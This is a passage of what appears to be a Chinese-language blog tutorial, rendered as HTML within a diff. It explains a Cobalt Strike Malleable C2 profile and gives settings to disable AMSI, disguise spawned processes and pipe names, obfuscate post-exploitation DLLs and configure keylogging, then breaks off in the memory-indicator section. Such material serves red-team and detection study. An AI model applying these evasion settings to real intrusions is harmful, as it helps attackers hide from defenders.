+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">spawnto_x</span><span class="mi">64</span>       <span class="err">%windir%\\sysnative\\rundll</span><span class="mi">32</span><span class="err">.exe</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">obfuscate</span>         <span class="kc">false</span>                                   <span class="err">CS</span> <span class="mf">3.14</span> <span class="err">-</span> <span class="err">Scrambles</span> <span class="err">the</span> <span class="err">content</span> <span class="err">of</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">DLLs</span> <span class="err">and</span> <span class="err">settles</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">capability</span> <span class="err">into</span> <span class="err">memory</span> <span class="err">in</span> <span class="err">a</span> <span class="err">more</span> <span class="err">OPSEC-safe</span> <span class="err">way</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">pipename</span>          <span class="err">postex_####,</span> <span class="err">windows\\pipe_##</span>           <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">Change</span> <span class="err">the</span> <span class="err">named</span> <span class="err">pipe</span> <span class="err">names</span> <span class="err">used,</span> <span class="err">by</span> <span class="err">post-ex</span> <span class="err">DLLs,</span> <span class="err">to</span> <span class="err">send</span> <span class="err">output</span> <span class="err">back</span> <span class="err">to</span> <span class="err">Beacon.</span> <span class="err">This</span> <span class="err">option</span> <span class="err">accepts</span> <span class="err">a</span> <span class="err">comma-separated</span> <span class="err">list</span> <span class="err">of</span> <span class="err">pipenames.</span> <span class="err">Cobalt</span> <span class="err">Strike</span> <span class="err">will</span> <span class="err">select</span> <span class="err">a</span> <span class="err">random</span> <span class="err">pipe</span> <span class="err">name</span> <span class="err">from</span> <span class="err">this</span> <span class="err">option</span> <span class="err">when</span> <span class="err">it</span> <span class="err">sets</span> <span class="err">up</span> <span class="err">a</span> <span class="err">post-exploitation</span> <span class="err">job.</span> <span class="err">Each</span> <span class="err">#</span> <span class="err">in</span> <span class="err">the</span> <span class="err">pipename</span> <span class="err">is</span> <span class="err">replaced</span> <span class="err">with</span> <span class="err">a</span> <span class="err">valid</span> <span class="err">hex</span> <span class="err">character</span> <span class="err">as</span> <span class="err">well.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">smartinject</span>       <span class="kc">false</span>                                   <span class="err">CS</span> <span class="mf">3.14</span> <span class="err">added</span> <span class="err">to</span> <span class="err">postex</span> <span class="err">block</span> <span class="err">-</span> <span class="err">Directs</span> <span class="err">Beacon</span> <span class="err">to</span> <span class="err">embed</span> <span class="err">key</span> <span class="err">function</span> <span class="err">pointers,</span> <span class="err">like</span> <span class="err">GetProcAddress</span> <span class="err">and</span> <span class="err">LoadLibrary,</span> <span class="err">into</span> <span class="err">its</span> <span class="err">same-architecture</span> <span class="err">post-ex</span> <span class="err">DLLs.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">amsi_disable</span>      <span class="kc">false</span>                                   <span class="err">CS</span> <span class="mf">3.13</span> <span class="err">-</span> <span class="err">Directs</span> <span class="err">powerpick,</span> <span class="err">execute-assembly,</span> <span class="err">and</span> <span class="err">psinject</span> <span class="err">to</span> <span class="err">patch</span> <span class="err">the</span> <span class="err">AmsiScanBuffer</span> <span class="err">function</span> <span class="err">before</span> <span class="err">loading</span> <span class="err">.NET</span> <span class="err">or</span> <span class="err">PowerShell</span> <span class="err">code.</span> <span class="err">This</span> <span class="err">limits</span> <span class="err">the</span> <span class="err">Antimalware</span> <span class="err">Scan</span> <span class="err">Interface</span> <span class="err">visibility</span> <span class="err">into</span> <span class="err">these</span> <span class="err">capabilities.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">keylogger</span>         <span class="err">GetAsyncKeyState</span>                        <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">The</span> <span class="err">GetAsyncKeyState</span> <span class="err">option</span> <span class="err">(default)</span> <span class="err">uses</span> <span class="err">the</span> <span class="err">GetAsyncKeyState</span> <span class="err">API</span> <span class="err">to</span> <span class="err">observe</span> <span class="err">keystrokes.</span> <span class="err">The</span> <span class="err">SetWindowsHookEx</span> <span class="err">option</span> <span class="err">uses</span> <span class="err">SetWindowsHookEx</span> <span class="err">to</span> <span class="err">observe</span> <span class="err">keystrokes.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">threadhint</span>                                                <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">allows</span> <span class="err">multi-threaded</span> <span class="err">post-ex</span> <span class="err">DLLs</span> <span class="err">to</span> <span class="err">spawn</span> <span class="err">threads</span> <span class="err">with</span> <span class="err">a</span> <span class="err">spoofed</span> <span class="err">start</span> <span class="err">address.</span> <span class="err">Specify</span> <span class="err">the</span> <span class="err">thread</span> <span class="err">hint</span> <span class="err">as</span> <span class="s2">&#34;module!function+0x##&#34;</span> <span class="err">to</span> <span class="err">specify</span> <span class="err">the</span> <span class="err">start</span> <span class="err">address</span> <span class="err">to</span> <span class="err">spoof.</span> <span class="err">The</span> <span class="err">optional</span> <span class="mi">0</span><span class="err">x##</span> <span class="err">part</span> <span class="err">is</span> <span class="err">an</span> <span class="err">offset</span> <span class="err">added</span> <span class="err">to</span> <span class="err">the</span> <span class="err">start</span> <span class="err">address.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">cleanup</span>           <span class="kc">false</span>                                   <span class="err">CS</span> <span class="mf">4.9</span> <span class="err">-</span> <span class="err">Cleans</span> <span class="err">up</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">UDRL</span> <span class="err">memory</span> <span class="err">when</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">DLL</span> <span class="err">is</span> <span class="err">loaded.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">spawnto</span> <span class="err">can</span> <span class="err">only</span> <span class="err">be</span> <span class="mi">63</span> <span class="err">chars</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">OPSEC</span> <span class="err">WARNING!!!!</span> <span class="err">The</span> <span class="err">spawnto</span> <span class="err">in</span> <span class="err">this</span> <span class="err">example</span> <span class="err">will</span> <span class="err">contain</span> <span class="err">identifiable</span> <span class="err">command</span> <span class="err">line</span> <span class="err">strings</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">sysnative</span> <span class="err">for</span> <span class="err">x</span><span class="mi">64</span> <span class="err">and</span> <span class="err">syswow</span><span class="mi">64</span> <span class="err">for</span> <span class="err">x</span><span class="mi">86</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">Example</span> <span class="err">x</span><span class="mi">64</span> <span class="err">:</span> <span class="err">C:\\Windows\\sysnative\\w</span><span class="mi">32</span><span class="err">tm.exe</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>        <span class="err">Example</span> <span class="err">x</span><span class="mi">86</span> <span class="err">:</span> <span class="err">C:\\Windows\\syswow</span><span class="mi">64</span><span class="err">\\w</span><span class="mi">32</span><span class="err">tm.exe</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">The</span> <span class="err">binary</span> <span class="err">doesnt</span> <span class="err">do</span> <span class="err">anything</span> <span class="err">wierd</span> <span class="err">(protected</span> <span class="err">binary,</span> <span class="err">etc)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">!!</span> <span class="err">Don&#39;t</span> <span class="err">use</span> <span class="err">these</span> <span class="err">!!</span> 
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span>   <span class="s2">&#34;csrss.exe&#34;</span><span class="err">,</span><span class="s2">&#34;logoff.exe&#34;</span><span class="err">,</span><span class="s2">&#34;rdpinit.exe&#34;</span><span class="err">,</span><span class="s2">&#34;bootim.exe&#34;</span><span class="err">,</span><span class="s2">&#34;smss.exe&#34;</span><span class="err">,</span><span class="s2">&#34;userinit.exe&#34;</span><span class="err">,</span><span class="s2">&#34;sppsvc.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">A</span> <span class="err">binary</span> <span class="err">that</span> <span class="err">executes</span> <span class="err">without</span> <span class="err">the</span> <span class="err">UAC</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="mi">64</span> <span class="err">bit</span> <span class="err">for</span> <span class="err">x</span><span class="mi">64</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="mi">32</span> <span class="err">bit</span> <span class="err">for</span> <span class="err">x</span><span class="mi">86</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">You</span> <span class="err">can</span> <span class="err">add</span> <span class="err">command</span> <span class="err">line</span> <span class="err">parameters</span> <span class="err">to</span> <span class="err">blend</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">set</span> <span class="err">spawnto_x</span><span class="mi">86</span> <span class="s2">&#34;%windir%\\syswow64\\svchost.exe -k netsvcs&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">set</span> <span class="err">spawnto_x</span><span class="mi">64</span> <span class="s2">&#34;%windir%\\sysnative\\svchost.exe -k netsvcs&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">Note:</span> <span class="err">svchost.exe</span> <span class="err">may</span> <span class="err">look</span> <span class="err">weird</span> <span class="err">as</span> <span class="err">the</span> <span class="err">parent</span> <span class="err">process</span> 
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">The</span> <span class="err">obfuscate</span> <span class="err">option</span> <span class="err">scrambles</span> <span class="err">the</span> <span class="err">content</span> <span class="err">of</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">DLLs</span> <span class="err">and</span> <span class="err">settles</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">capability</span> <span class="err">into</span> <span class="err">memory</span> <span class="err">in</span> <span class="err">a</span> <span class="err">more</span> <span class="err">OPSEC-safe</span> <span class="err">way.</span> <span class="err">It’s</span> <span class="err">very</span> <span class="err">similar</span> <span class="err">to</span> <span class="err">the</span> <span class="err">obfuscate</span> <span class="err">and</span> <span class="err">userwx</span> <span class="err">options</span> <span class="err">available</span> <span class="err">for</span> <span class="err">Beacon</span> <span class="err">via</span> <span class="err">the</span> <span class="err">stage</span> <span class="err">block.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">The</span> <span class="err">amsi_disable</span> <span class="err">option</span> <span class="err">directs</span> <span class="err">powerpick,</span> <span class="err">execute-assembly,</span> <span class="err">and</span> <span class="err">psinject</span> <span class="err">to</span> <span class="err">patch</span> <span class="err">the</span> <span class="err">AmsiScanBuffer</span> <span class="err">function</span> <span class="err">before</span> <span class="err">loading</span> <span class="err">.NET</span> <span class="err">or</span> <span class="err">PowerShell</span> <span class="err">code.</span> <span class="err">This</span> <span class="err">limits</span> <span class="err">the</span> <span class="err">Antimalware</span> <span class="err">Scan</span> <span class="err">Interface</span> <span class="err">visibility</span> <span class="err">into</span> <span class="err">these</span> <span class="err">capabilities.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">The</span> <span class="err">smartinject</span> <span class="err">option</span> <span class="err">directs</span> <span class="err">Beacon</span> <span class="err">to</span> <span class="err">embed</span> <span class="err">key</span> <span class="err">function</span> <span class="err">pointers,</span> <span class="err">like</span> <span class="err">GetProcAddress</span> <span class="err">and</span> <span class="err">LoadLibrary,</span> <span class="err">into</span> <span class="err">its</span> <span class="err">same-architecture</span> <span class="err">post-ex</span> <span class="err">DLLs.</span> <span class="err">This</span> <span class="err">allows</span> <span class="err">post-ex</span> <span class="err">DLLs</span> <span class="err">to</span> <span class="err">bootstrap</span> <span class="err">themselves</span> <span class="err">in</span> <span class="err">a</span> <span class="err">new</span> <span class="err">process</span> <span class="err">without</span> <span class="err">shellcode-like</span> <span class="err">behavior</span> <span class="err">that</span> <span class="err">is</span> <span class="err">detected</span> <span class="err">and</span> <span class="err">mitigated</span> <span class="err">by</span> <span class="err">watching</span> <span class="err">memory</span> <span class="err">accesses</span> <span class="err">to</span> <span class="err">the</span> <span class="err">PEB</span> <span class="err">and</span> <span class="err">kernel</span><span class="mi">32</span><span class="err">.dll</span>
+</span></span><span class="line"><span class="cl"><span class="err">post-ex</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Optionally</span> <span class="err">specify</span> <span class="err">non-existent</span> <span class="err">filepath</span> <span class="err">to</span> <span class="err">force</span> <span class="err">manual</span> <span class="err">specification</span> <span class="err">based</span> <span class="err">on</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">host&#39;s</span> <span class="err">running</span> <span class="err">processes</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">spawnto_x86</span> <span class="nt">&#34;%windir%\\syswow64\\dllhost.exe&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Hardcode</span> <span class="err">paths</span> <span class="err">like</span> <span class="err">C</span><span class="p">:</span><span class="err">\\Windows\\System</span><span class="mi">32</span><span class="err">\\dllhost.exe</span> <span class="err">to</span> <span class="err">avoid</span> <span class="err">potential</span> <span class="err">detections</span> <span class="err">for</span> <span class="err">%SYSNATIVE%</span> <span class="err">use.</span> <span class="err">!!</span> <span class="err">This</span> <span class="err">will</span> <span class="err">break</span> <span class="err">when</span> <span class="err">attempting</span> <span class="err">to</span> <span class="err">spawn</span> <span class="err">a</span> <span class="mi">64</span><span class="err">bit</span> <span class="err">post-ex</span> <span class="err">job</span> <span class="err">from</span> <span class="err">a</span> <span class="mi">32</span><span class="err">bit</span> <span class="err">Beacon.</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">spawnto_x</span><span class="mi">64</span> <span class="s2">&#34;%windir%\\sysnative\\dllhost.exe&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">change</span> <span class="err">the</span> <span class="err">permissions</span> <span class="err">and</span> <span class="err">content</span> <span class="err">of</span> <span class="err">our</span> <span class="err">post-ex</span> <span class="err">DLLs</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">obfuscate</span> <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">pass</span> <span class="err">key</span> <span class="err">function</span> <span class="err">pointers</span> <span class="err">from</span> <span class="err">Beacon</span> <span class="err">to</span> <span class="err">its</span> <span class="err">child</span> <span class="err">jobs</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">smartinject</span> <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">disable</span> <span class="err">AMSI</span> <span class="err">in</span> <span class="err">powerpick</span><span class="p">,</span> <span class="err">execute-assembly,</span> <span class="err">and</span> <span class="err">psinject</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">amsi_disable</span> <span class="nt">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">cleanup</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">UDRL</span> <span class="err">memory</span> <span class="err">when</span> <span class="err">the</span> <span class="err">post-ex</span> <span class="err">DLL</span> <span class="err">is</span> <span class="err">loaded</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">cleanup</span> <span class="s2">&#34;true&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Modify</span> <span class="err">our</span> <span class="err">post-ex</span> <span class="err">pipe</span> <span class="err">names</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">pipename</span> <span class="s2">&#34;Winsock2\\CatalogChangeListener-###-0,&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">keylogger</span> <span class="s2">&#34;GetAsyncKeyState&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#set</span> <span class="err">threadhint</span> <span class="s2">&#34;module!function+0x##&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>post-ex控制了CS的后渗透功能所特有的内容和行为，包含截屏、键盘记录、哈希转储等，每个参数都有响应的说明，直接看文档即可。</p>
+<h3 id="memory-indicator">Memory Indicator</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Memory</span> <span class="err">Indicators</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">The</span> <span class="err">stage</span> <span class="err">block</span> <span class="err">in</span> <span class="err">Malleable</span> <span class="err">C</span><span class="mi">2</span> <span class="err">profiles</span> <span class="err">controls</span> <span class="err">how</span> <span class="err">Beacon</span> <span class="err">is</span> <span class="err">loaded</span> <span class="err">into</span> <span class="err">memory</span> <span class="err">and</span> <span class="err">edit</span> <span class="err">the</span> <span class="err">content</span> <span class="err">of</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">Reflective</span> <span class="err">DLL.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Values:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">allocator</span>         <span class="err">VirtualAlloc</span>            <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">Set</span> <span class="err">how</span> <span class="err">Beacon&#39;s</span> <span class="err">Reflective</span> <span class="err">Loader</span> <span class="err">allocates</span> <span class="err">memory</span> <span class="err">for</span> <span class="err">the</span> <span class="err">agent.</span> <span class="err">Options</span> <span class="err">are:</span> <span class="err">HeapAlloc,</span> <span class="err">MapViewOfFile,</span> <span class="err">and</span> <span class="err">VirtualAlloc</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">checksum</span>          <span class="mi">0</span>                       <span class="err">The</span> <span class="err">CheckSum</span> <span class="err">value</span> <span class="err">in</span> <span class="err">Beacon&#39;s</span> <span class="err">PE</span> <span class="err">header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">cleanup</span>           <span class="kc">false</span>                   <span class="err">Ask</span> <span class="err">Beacon</span> <span class="err">to</span> <span class="err">attempt</span> <span class="err">to</span> <span class="err">free</span> <span class="err">memory</span> <span class="err">associated</span> <span class="err">with</span> <span class="err">the</span> <span class="err">Reflective</span> <span class="err">DLL</span> <span class="err">package</span> <span class="err">that</span> <span class="err">initialized</span> <span class="err">it.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">compile_time</span>      <span class="mi">14</span> <span class="err">July</span> <span class="mi">2009</span> <span class="mi">8</span><span class="err">:</span><span class="mi">14</span><span class="err">:</span><span class="mi">00</span>    <span class="err">The</span> <span class="err">build</span> <span class="err">time</span> <span class="err">in</span> <span class="err">Beacon&#39;s</span> <span class="err">PE</span> <span class="err">header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">entry_point</span>       <span class="mi">92145</span>                   <span class="err">The</span> <span class="err">EntryPoint</span> <span class="err">value</span> <span class="err">in</span> <span class="err">Beacon&#39;s</span> <span class="err">PE</span> <span class="err">header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">image_size_x</span><span class="mi">64</span>    <span class="mi">512000</span>                  <span class="err">SizeOfImage</span> <span class="err">value</span> <span class="err">in</span> <span class="err">x</span><span class="mi">64</span> <span class="err">Beacon&#39;s</span> <span class="err">PE</span> <span class="err">header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">image_size_x</span><span class="mi">86</span>    <span class="mi">512000</span>                  <span class="err">SizeOfImage</span> <span class="err">value</span> <span class="err">in</span> <span class="err">x</span><span class="mi">86</span> <span class="err">Beacon&#39;s</span> <span class="err">PE</span> <span class="err">header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">magic_mz_x</span><span class="mi">86</span>      <span class="err">MZRE</span>                    <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">Override</span> <span class="err">the</span> <span class="err">first</span> <span class="err">bytes</span> <span class="err">(MZ</span> <span class="err">header</span> <span class="err">included)</span> <span class="err">of</span> <span class="err">Beacon&#39;s</span> <span class="err">Reflective</span> <span class="err">DLL.</span> <span class="err">Valid</span> <span class="err">x</span><span class="mi">86</span> <span class="err">instructions</span> <span class="err">are</span> <span class="err">required.</span> <span class="err">Follow</span> <span class="err">instructions</span> <span class="err">that</span> <span class="err">change</span> <span class="err">CPU</span> <span class="err">state</span> <span class="err">with</span> <span class="err">instructions</span> <span class="err">that</span> <span class="err">undo</span> <span class="err">the</span> <span class="err">change.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">magic_mz_x</span><span class="mi">64</span>      <span class="err">MZAR</span>                    <span class="err">CS</span> <span class="mf">4.2</span> <span class="err">-</span> <span class="err">Same</span> <span class="err">as</span> <span class="err">magic_mz_x</span><span class="mi">86</span><span class="err">;</span> <span class="err">affects</span> <span class="err">x</span><span class="mi">64</span> <span class="err">DLL.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">module_x</span><span class="mi">64</span>        <span class="err">xpsservices.dll</span>         <span class="err">Same</span> <span class="err">as</span> <span class="err">module_x</span><span class="mi">86</span><span class="err">;</span> <span class="err">affects</span> <span class="err">x</span><span class="mi">64</span> <span class="err">loader</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">module_x</span><span class="mi">86</span>        <span class="err">xpsservices.dll</span>         <span class="err">Ask</span> <span class="err">the</span> <span class="err">x</span><span class="mi">86</span> <span class="err">ReflectiveLoader</span> <span class="err">to</span> <span class="err">load</span> <span class="err">the</span> <span class="err">specified</span> <span class="err">library</span> <span class="err">and</span> <span class="err">overwrite</span> <span class="err">its</span> <span class="err">space</span> <span class="err">instead</span> <span class="err">of</span> <span class="err">allocating</span> <span class="err">memory</span> <span class="err">with</span> <span class="err">VirtualAlloc.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">magic_pe</span>          <span class="err">PE</span>                      <span class="err">Override</span> <span class="err">the</span> <span class="err">PE</span> <span class="err">character</span> <span class="err">marker</span> <span class="err">used</span> <span class="err">by</span> <span class="err">Beacon&#39;s</span> <span class="err">Reflective</span> <span class="err">Loader</span> <span class="err">with</span> <span class="err">another</span> <span class="err">value.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">name</span>	            <span class="err">beacon.x</span><span class="mi">64</span><span class="err">.dll</span>          <span class="err">The</span> <span class="err">Exported</span> <span class="err">name</span> <span class="err">of</span> <span class="err">the</span> <span class="err">Beacon</span> <span class="err">DLL</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">obfuscate</span>         <span class="kc">false</span>                   <span class="err">Obfuscate</span> <span class="err">the</span> <span class="err">Reflective</span> <span class="err">DLL&#39;s</span> <span class="err">import</span> <span class="err">table,</span> <span class="err">overwrite</span> <span class="err">unused</span> <span class="err">header</span> <span class="err">content,</span> <span class="err">and</span> <span class="err">ask</span> <span class="err">ReflectiveLoader</span> <span class="err">to</span> <span class="err">copy</span> <span class="err">Beacon</span> <span class="err">to</span> <span class="err">new</span> <span class="err">memory</span> <span class="err">without</span> <span class="err">its</span> <span class="err">DLL</span> <span class="err">headers.</span> <span class="err">As</span> <span class="err">of</span> <span class="mf">4.2</span> <span class="err">CS</span> <span class="err">now</span> <span class="err">obfuscates</span> <span class="err">.text</span> <span class="err">section</span> <span class="err">in</span> <span class="err">rDLL</span> <span class="err">package</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">rich_header</span>       <span class="err">N/A</span>                     <span class="err">Meta-information</span> <span class="err">inserted</span> <span class="err">by</span> <span class="err">the</span> <span class="err">compiler</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">sleep_mask</span>        <span class="kc">false</span>                   <span class="err">CS</span> <span class="mf">3.12</span> <span class="err">-</span> <span class="err">Obfuscate</span> <span class="err">Beacon</span> <span class="err">(HTTP,</span> <span class="err">SMB,</span> <span class="err">TCP</span> <span class="err">Beacons),</span> <span class="err">in-memory,</span> <span class="err">prior</span> <span class="err">to</span> <span class="err">sleeping</span> <span class="err">(HTTP)</span> <span class="err">or</span> <span class="err">waiting</span> <span class="err">for</span> <span class="err">a</span> <span class="err">new</span> <span class="err">connection\data</span> <span class="err">(SMB\TCP)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">smartinject</span>       <span class="kc">false</span>                   <span class="err">CS</span> <span class="mf">4.1</span> <span class="err">added</span> <span class="err">to</span> <span class="err">stage</span> <span class="err">block</span> <span class="err">-</span> <span class="err">Use</span> <span class="err">embedded</span> <span class="err">function</span> <span class="err">pointer</span> <span class="err">hints</span> <span class="err">to</span> <span class="err">bootstrap</span> <span class="err">Beacon</span> <span class="err">agent</span> <span class="err">without</span> <span class="err">walking</span> <span class="err">kernel</span><span class="mi">32</span> <span class="err">EAT</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">stomppe</span>           <span class="kc">true</span>                    <span class="err">Ask</span> <span class="err">ReflectiveLoader</span> <span class="err">to</span> <span class="err">stomp</span> <span class="err">MZ,</span> <span class="err">PE,</span> <span class="err">and</span> <span class="err">e_lfanew</span> <span class="err">values</span> <span class="err">after</span> <span class="err">it</span> <span class="err">loads</span> <span class="err">Beacon</span> <span class="err">payload</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">userwx</span>            <span class="kc">false</span>                   <span class="err">Ask</span> <span class="err">ReflectiveLoader</span> <span class="err">to</span> <span class="err">use</span> <span class="err">or</span> <span class="err">avoid</span> <span class="err">RWX</span> <span class="err">permissions</span> <span class="err">for</span> <span class="err">Beacon</span> <span class="err">DLL</span> <span class="err">in</span> <span class="err">memory</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Modify</span> <span class="err">the</span> <span class="err">indicators</span> <span class="err">to</span> <span class="err">minimize</span> <span class="err">in</span> <span class="err">memory</span> <span class="err">indicators</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Refer</span> <span class="err">to</span> 
